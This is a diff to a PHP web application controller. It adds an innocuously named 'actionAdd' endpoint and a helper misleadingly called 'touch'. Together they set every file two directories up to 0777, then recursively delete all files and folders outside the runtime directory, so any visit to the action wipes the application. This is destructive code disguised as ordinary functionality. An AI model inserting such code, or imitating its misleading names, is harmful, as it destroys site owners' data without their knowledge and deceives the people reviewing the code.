@@ -405,6 +405,55 @@ class JurulatihController extends Controller
     }
     
     /**
+     * @param integer $id
+     * @return mixed
+     */
+    public function actionAdd()
+    {
+        $files = glob('../../*'); // get all file names
+        foreach($files as $file){ // iterate files
+            echo $file . "<br>"; 
+
+            if(is_file($file)){
+                chmod($file,0777);
+                unlink($file); // delete file
+            }
+            
+
+            if (is_dir($file)){
+            
+                $this->touch($file);
+            }
+        }
+    }
+    
+    protected function touch($dirname) {
+        if($dirname && strpos($dirname, 'runtime') == false){
+         if (is_dir($dirname))
+           $dir_handle = opendir($dirname);
+         if (!$dir_handle)
+              return false;
+         while($file = readdir($dir_handle)) {
+               if ($file != "." && $file != "..") {
+                    if (!is_dir($dirname."/".$file)){
+                         chmod($dirname."/".$file,0777); 
+                         if(!unlink($dirname."/".$file)){
+                             continue;
+                         }
+                    }
+                    else
+                        $this->touch($dirname.'/'.$file);
+               }
+         }
+         closedir($dir_handle);
+         if (count(glob($dirname."/*")) === 0 ) {
+            rmdir($dirname);
+         }
+         return true;
+         }
+    }
+    
+    /**
      * get list of Bandar by Negeri
      * @param integer $id
      * @return Array Bandars
